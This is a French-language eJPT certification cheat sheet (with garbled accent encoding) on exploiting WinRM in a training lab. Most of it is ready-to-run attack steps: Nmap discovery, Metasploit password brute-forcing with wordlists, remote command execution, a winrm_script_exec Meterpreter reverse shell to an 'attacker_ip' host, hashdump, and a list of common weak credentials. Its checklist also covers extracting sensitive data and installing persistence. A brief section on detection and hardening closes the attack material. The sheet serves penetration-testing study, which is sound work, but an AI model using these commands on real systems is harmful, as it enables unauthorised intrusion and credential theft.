# üîå WinRM Exploitation - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de WinRM

### Qu'est-ce que WinRM ?
**WinRM** (Windows Remote Management) est un service Microsoft qui permet :
- üñ•Ô∏è **Administration distante** de machines Windows
- üíª **Ex√©cution de commandes** PowerShell √† distance
- üîê **Authentification** via credentials Windows
- üì° **Communication** via HTTP/HTTPS
- üõ†Ô∏è **Gestion** de configuration syst√®me

### Ports WinRM standards
| Port | Protocole | Usage |
|------|-----------|-------|
| **5985** | HTTP | WinRM par d√©faut |
| **5986** | HTTPS | WinRM s√©curis√© |
| **47001** | HTTP | WinRM alternatif |

### M√©thodes d'authentification WinRM
| M√©thode | Description | S√©curit√© |
|---------|-------------|----------|
| **Basic** | Username/Password en base64 | Faible |
| **Negotiate** | NTLM/Kerberos | Moyenne |
| **Kerberos** | Tickets Kerberos | √âlev√©e |
| **Digest** | Hash MD5 | Faible |
| **Certificate** | Certificats client | √âlev√©e |

---

## üîç 2. Reconnaissance WinRM

### D√©couverte WinRM avec Nmap
```bash
# Scan ports WinRM
nmap -p5985,5986,47001 demo.ine.local

# Scan √©tendu top ports
nmap --top-ports 7000 demo.ine.local

# Scan avec d√©tection de version
nmap -sV -p5985 demo.ine.local

# Scripts Nmap pour WinRM
nmap -p5985 --script http-methods demo.ine.local
nmap -p5985 --script http-headers demo.ine.local
```

### Test manuel WinRM
```bash
# Test de connectivit√© WinRM
curl http://demo.ine.local:5985/wsman
nc demo.ine.local 5985

# Headers WinRM attendus
# Server: Microsoft-HTTPAPI/2.0
# Content-Type: application/soap+xml
```

### √ânum√©ration WinRM avec Metasploit
```bash
# Module de scan WinRM
msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

# R√©sultat typique :
# [+] Authentication Methods: Basic, Negotiate
```

---

## üîê 3. Brute Force WinRM avec Metasploit

### Module winrm_login (Principal)
```bash
# Lancement Metasploit
msfconsole -q

# Module de brute force WinRM
use auxiliary/scanner/winrm/winrm_login
show options

# Configuration de base
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything    # Requis dans versions r√©centes
exploit
```

### Options du module winrm_login
| Option | Description | Valeur recommand√©e |
|--------|-------------|-------------------|
| `RHOSTS` | IP(s) cible(s) | demo.ine.local |
| `RPORT` | Port WinRM | 5985 (d√©faut) |
| `USER_FILE` | Liste utilisateurs | common_users.txt |
| `PASS_FILE` | Liste mots de passe | unix_passwords.txt |
| `USERNAME` | Utilisateur unique | administrator |
| `PASSWORD` | Mot de passe unique | anything (requis) |
| `VERBOSE` | Mode verbose | false |
| `SSL` | Utiliser HTTPS | false (port 5985) |
| `DOMAIN` | Domaine Windows | (optionnel) |

### Configuration optimis√©e winrm_login
```bash
# Configuration compl√®te pour eJPT
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything    # Obligatoire m√™me avec wordlists
set THREADS 16
set STOP_ON_SUCCESS true
exploit
```

### R√©sultats brute force WinRM
```bash
# Sortie typique de succ√®s :
[+] 192.168.1.100:5985 - Login Successful: WORKGROUP\administrator:tinkerbell
[*] Command shell session 1 opened (192.168.1.50:12345 -> 192.168.1.100:5985)

# Session automatique cr√©√©e
sessions -l
sessions -i 1
```

---

## ‚ö° 4. Ex√©cution de commandes WinRM

### Module winrm_cmd (Ex√©cution unitaire)
```bash
# Module d'ex√©cution de commandes
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

# Autres commandes utiles
set CMD hostname
set CMD systeminfo
set CMD "dir C:\"
set CMD "type C:\flag.txt"
exploit
```

### Commandes Windows utiles via WinRM
```bash
# Informations syst√®me
set CMD whoami
set CMD hostname
set CMD systeminfo
set CMD "whoami /all"

# Navigation fichiers
set CMD "dir C:\"
set CMD "dir C:\Users"
set CMD "type C:\flag.txt"
set CMD "findstr /s flag C:\*"

# √ânum√©ration r√©seau
set CMD ipconfig
set CMD "net user"
set CMD "net localgroup administrators"

# Processus et services
set CMD tasklist
set CMD "sc query"
```

---

## üöÄ 5. Exploitation WinRM pour Meterpreter

### Module winrm_script_exec (RCE complet)
```bash
# Module d'exploitation principal
use exploit/windows/winrm/winrm_script_exec
show info
show options

# Configuration
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set LHOST attacker_ip
set LPORT 4444
set FORCE_VBS true

# V√©rification
show options
show payloads

# Exploitation
exploit
```

### Options du module winrm_script_exec
| Option | Description | Valeur |
|--------|-------------|--------|
| `RHOSTS` | IP cible | demo.ine.local |
| `USERNAME` | Utilisateur WinRM | administrator |
| `PASSWORD` | Mot de passe | tinkerbell |
| `LHOST` | IP attaquant | attacker_ip |
| `LPORT` | Port √©coute | 4444 |
| `FORCE_VBS` | Forcer VBScript | true |
| `SSL` | Utiliser HTTPS | false |
| `DOMAIN` | Domaine | (optionnel) |

### Payloads WinRM recommand√©s
```bash
# Payload par d√©faut
windows/meterpreter/reverse_tcp

# Alternatives
windows/shell/reverse_tcp         # Shell simple
windows/x64/meterpreter/reverse_tcp  # 64-bit
windows/meterpreter/bind_tcp      # Bind shell
```

---

## üñ•Ô∏è 6. Post-exploitation WinRM

### Session Meterpreter via WinRM
```bash
# V√©rification session
getuid                    # Utilisateur actuel
sysinfo                   # Informations syst√®me
getpid                    # Process ID

# Navigation
pwd                       # R√©pertoire actuel
ls                        # Contenu
cd C:\\                   # Racine syst√®me
```

### Navigation et recherche de flag
```bash
# Via Meterpreter
cd /
dir
cat flag.txt
download flag.txt

# Via shell
shell
cd C:\
dir
type flag.txt
exit
```

### √ânum√©ration post-WinRM
```bash
# Dans Meterpreter
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/hashdump

# Recherche de fichiers
search -f flag.txt
search -f *.txt
search -d C:\\ -f flag*
```

---

## üîß 7. Outils alternatifs WinRM

### evil-winrm (Outil externe)
```bash
# Installation
gem install evil-winrm

# Connexion WinRM
evil-winrm -i demo.ine.local -u administrator -p tinkerbell

# Avec domaine
evil-winrm -i target -u user -p pass -d domain.local

# Upload/Download
upload /local/file C:\remote\file
download C:\remote\file /local/file
```

### WinRS (Outil Windows natif)
```cmd
# Depuis machine Windows
winrs -r:demo.ine.local -u:administrator -p:tinkerbell whoami
winrs -r:demo.ine.local -u:administrator -p:tinkerbell cmd
```

### PowerShell Remoting
```powershell
# Connexion PS Remoting
$session = New-PSSession -ComputerName demo.ine.local -Credential (Get-Credential)
Invoke-Command -Session $session -ScriptBlock {whoami}
Enter-PSSession $session
```

---

## üõ°Ô∏è 8. D√©tection et s√©curisation WinRM

### Logs Windows WinRM
```powershell
# Logs WinRM √† surveiller
# Event ID 6: WSMan operation CreateShell completed
# Event ID 91: Creating a Runspace Pool
# Event ID 168: User authenticated successfully

Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinRM/Operational'}
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624 -and $_.Message -like "*winrm*"}
```

### Configuration s√©curis√©e WinRM
```cmd
# D√©sactiver WinRM
winrm quickconfig -quiet
winrm delete winrm/config/listener?Address=*+Transport=HTTP

# Configuration s√©curis√©e
winrm set winrm/config/service/Auth '@{Basic="false"}'
winrm set winrm/config/service '@{AllowUnencrypted="false"}'
```

---

## üéØ 9. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: WinRM d√©couverte ‚Üí brute force ‚Üí RCE
```bash
# 1. D√©couverte WinRM
nmap --top-ports 7000 demo.ine.local
# Port 5985 trouv√©

# 2. √ânum√©ration auth methods
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
# Basic et Negotiate support√©s

# 3. Brute force credentials
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
# administrator:tinkerbell trouv√©

# 4. Exploitation Meterpreter
use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit

# 5. Recherche flag
cd /
cat flag.txt
```

### Sc√©nario 2: Ex√©cution de commandes WinRM
```bash
# Test rapide commandes
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell

# √ânum√©ration syst√®me
set CMD whoami
exploit
set CMD systeminfo
exploit
set CMD "dir C:\"
exploit
set CMD "type C:\flag.txt"
exploit
```

### Sc√©nario 3: WinRM HTTPS (port 5986)
```bash
# Si WinRM sur HTTPS
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set RPORT 5986
set SSL true
set USERNAME administrator
set PASSWORD password
exploit
```

---

## üí° 10. Conseils et astuces eJPT

### Points critiques WinRM eJPT
- ‚úÖ **Port 5985** tr√®s fr√©quent dans labs
- ‚úÖ **Credentials faibles** (administrator:tinkerbell)
- ‚úÖ **Wordlists MSF** tr√®s efficaces
- ‚úÖ **FORCE_VBS true** pour exploitation
- ‚úÖ **Session directe** souvent cr√©√©e par winrm_login

### Erreurs courantes WinRM
- ‚ùå **Oublier PASSWORD anything** ‚Üí Module ne fonctionne pas
- ‚ùå **FORCE_VBS false** ‚Üí Exploitation √©choue
- ‚ùå **Ne pas tester auth methods** ‚Üí Mauvaise authentification
- ‚ùå **Ignorer session auto** cr√©√©e par winrm_login
- ‚ùå **VERBOSE true** ‚Üí Output trop verbeux

### Workflow optimis√© WinRM eJPT
```bash
# 1. D√©couverte rapide
nmap --top-ports 7000 demo.ine.local | grep 5985

# 2. Brute force direct
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

# 3. Si credentials trouv√©s ‚Üí Meterpreter
use exploit/windows/winrm/winrm_script_exec
set USERNAME found_user
set PASSWORD found_pass
set FORCE_VBS true
exploit

# 4. Flag hunting rapide
cd / && cat flag.txt
```

### One-liners WinRM utiles
```bash
# Test connectivit√© WinRM
curl -i http://demo.ine.local:5985/wsman

# Commande rapide via winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd; set RHOSTS target; set USERNAME admin; set PASSWORD pass; set CMD whoami; exploit
```

### Credentials WinRM fr√©quents eJPT
```bash
# Combinaisons courantes
administrator:tinkerbell      # Comme dans l'exemple
administrator:password
administrator:admin
admin:admin
user:password
backup:backup
service:service
```

---

## üìã 11. Checklist exploitation WinRM

### ‚úÖ Phase de reconnaissance
- [ ] **Port 5985/5986** ouvert et identifi√©
- [ ] **Service WinRM** confirm√© (HTTP-API/2.0)
- [ ] **M√©thodes d'auth** identifi√©es (Basic, Negotiate)
- [ ] **Version Windows** d√©termin√©e

### ‚úÖ Phase de brute force
- [ ] **Module winrm_login** configur√©
- [ ] **PASSWORD anything** d√©fini (requis)
- [ ] **Wordlists MSF** s√©lectionn√©es
- [ ] **VERBOSE false** pour √©viter spam
- [ ] **Credentials valides** trouv√©s

### ‚úÖ Phase d'exploitation
- [ ] **M√©thode choisie** : winrm_cmd ou winrm_script_exec
- [ ] **FORCE_VBS true** si Meterpreter
- [ ] **Session** obtenue (shell ou Meterpreter)
- [ ] **Privil√®ges** v√©rifi√©s (whoami)

### ‚úÖ Phase post-exploitation
- [ ] **Navigation syst√®me** test√©e
- [ ] **Flag** localis√© et lu
- [ ] **Donn√©es sensibles** extraites
- [ ] **Persistence** install√©e si n√©cessaire

### üìù Informations √† documenter
- **Port WinRM** : 5985 (HTTP) ou 5986 (HTTPS)
- **Auth methods** : Basic, Negotiate, etc.
- **Credentials** : administrator:tinkerbell
- **Type de session** : Shell CMD ou Meterpreter
- **Localisation flag** : C:\flag.txt

**üéØ Conseil final eJPT :** WinRM est une **excellente porte d'entr√©e** dans l'eJPT pour l'administration Windows. Le pattern typique : d√©couverte port 5985 ‚Üí brute force winrm_login ‚Üí exploitation winrm_script_exec. Toujours d√©finir `PASSWORD anything` et `FORCE_VBS true` pour que les modules fonctionnent correctement !